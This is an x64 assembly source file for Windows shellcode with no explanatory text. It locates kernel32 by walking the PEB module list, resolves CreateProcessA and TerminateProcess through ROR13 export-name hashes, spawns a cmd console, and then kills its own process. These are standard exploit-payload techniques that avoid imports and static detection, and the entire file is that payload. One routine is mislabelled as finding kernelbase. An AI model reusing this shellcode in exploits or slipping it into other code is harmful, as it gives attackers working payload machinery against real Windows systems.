.code

find_kernelbase PROC
    sub rsp, 28h
    mov rcx, 60h                ; RCX = 0x60
    mov r8, gs:[rcx]            ; R8 = ptr to PEB ([GS:0x60])
    mov rdi, [r8+18h]           ; RDI = PEB->Ldr
    mov rdi, [rdi+30h]          ; RDI = PEB->Ldr->InLoadInitOrder
    xor rcx, rcx                ; RCX = 0
    mov dl, 4bh                 ; DL = "K"

next_module:
    mov rax, [rdi+10h]          ; RAX = InInitOrder[X].base_address
    mov rsi, [rdi+40h]          ; RSI = InInitOrder[X].module_name
    mov rdi, [rdi]              ; RDI = InInitOrder[X].flink (next)
    cmp [rsi+12*2], cx          ; (unicode) modulename[12] == 0x00 ?
    jne next_module             ; No: try next module
    cmp [rsi], dl               ; modulename starts with "K"
    jne next_module             ; No: try next module
    add rsp, 28h                ; Restore stack
    ret
find_kernelbase ENDP

lookup_func PROC
    sub rsp, 28h
    mov ebx, [rdi + 3ch]        ; Offset to PE Signature VMA
    add rbx, 88h                ; Export table relative offset
    add rbx, rdi                ; Export table VMA
    mov eax, [rbx]              ; Export directory relative offset
    mov rbx, rdi
    add rbx, rax                ; Export directory VMA
    mov eax, [rbx + 20h]        ; AddressOfNames relative offset
    mov r8, rdi
    add r8, rax                 ; AddressOfNAmes VMA
    mov ecx, [rbx + 18h]        ; NumberOfNames

check_names:
    jecxz func_exit             ; End of exported list
    dec ecx                     ; Search backwards through the exported functions
    mov eax, [r8 + rcx * 4]     ; Store the relative offset of the name
    mov rsi, rdi
    add rsi, rax                ; Set RSI to the VMA of the current name
    xor r9, r9                  ; R9 = 0
    xor rax, rax                ; RAX = 0
    cld                         ; Clear direction

calc_hash:
    lodsb                       ; Load the next byte from RSI into AL
    test al, al                 ; Test ourselves
    jz calc_finished            ; If the ZF is set,we've hit the null term
    ror r9d, 0dh                ; Rotate R9D 13 bits to the right
    add r9, rax                 ; Add the new byte to the accumulator
    jmp calc_hash               ; Next iteration

calc_finished:
    cmp r9d, edx                ; Compare the computed hash with the requested hash
    jnz check_names             ; No match, try the next one

find_addr:
    mov r8d, [rbx + 24h]        ; Ordinals table relative offset
    add r8, rdi                 ; Ordinals table VMA
    xor rax, rax                ; RAX = 0
    mov ax, [r8 + rcx * 2]      ; Extrapolate the function's ordinal
    mov r8d, [rbx + 1ch]        ; Address table relative offset
    add r8, rdi                 ; Address table VMA
    mov eax, [r8 + rax * 4]     ; Extract the relative function offset from its ordinal
    add rax, rdi                ; Function VMA
    add rsp, 28h
func_exit:
    ret
lookup_func ENDP

spawn_cmd PROC
    sub rsp, 500h
    call find_kernelbase        ; Get kernel base in RAX

locate_funcs:
    mov rdi, rax                ; Store moduleBase
    sub rsp, 8
    mov r15, rsp                ; Stack pointer for storage

locate_terminateprocess:
    mov edx, 078b5b983h         ; TerminateProcess
    call lookup_func
    mov [r15+88h], rax

locate_createprocessa:
    mov edx, 16b3fe72h
    call lookup_func
    mov [r15+90h], rax

setup_si_and_pi:
    mov rdi, r15                ; lpProcessInformation and lpStartupInfo
    add rdi, 300h
    mov rbx, rdi
    xor eax, eax
    mov ecx, 80h
    rep stosd                   ; Zero 0x80 bytes
    mov eax, 68h                ; lpStartupInfo.cb = sizeof(lpStartupInfo)
    mov [rbx], eax
    mov eax, 100h               ; STARTF_USESTDHANDLES
    mov [rbx+3ch], eax          ; lpStartupInfo.dwFlags
    xor rax, rax
    dec rax
    mov [rbx+50h], rax          ; lpStartupInfo.hStdInput = invalid handle
    mov [rbx+58h], rax          ; lpStartupInfo.hStdOutput = invalid handle
    mov [rbx+60h], rax          ; lpStartupInfo.hStdError = invalid handle

call_createprocessa:
    xor ecx, ecx                ; lpApplicationName
    mov rdx, r15                ; lpCommandLine
    add rdx, 180h
    mov eax, 646d63h            ; "cmd"
    mov [rdx], rax
    xor r8, r8                  ; lpProcessAttributes
    xor r9, r9                  ; lpThreadAttributes
    xor eax, eax
    mov [rsp + 20h], rax        ; bInheritHandles
    mov eax, 10h
    mov [rsp + 28h], rax        ; dwCreationFlags
    xor eax, eax
    mov [rsp + 30h], rax        ; lpEnvironment
    mov [rsp + 38h], rax        ; lpCurrentDirectory
    mov [rsp + 40h], rbx        ; lpStartupInfo
    add rbx, 68h
    mov [rsp + 48h], rbx        ; lpProcessInformation
    mov rax, [r15+90h]
    call rax

call_terminateprocess:
    xor rcx, rcx
    dec rcx                     ; Process handle
    xor rdx, rdx                ; Zero RDX == Exit Reason
    mov rax, [r15+88h]
    call rax                    ; TerminateProcess
    add rsp, 500h

spawn_cmd ENDP

END
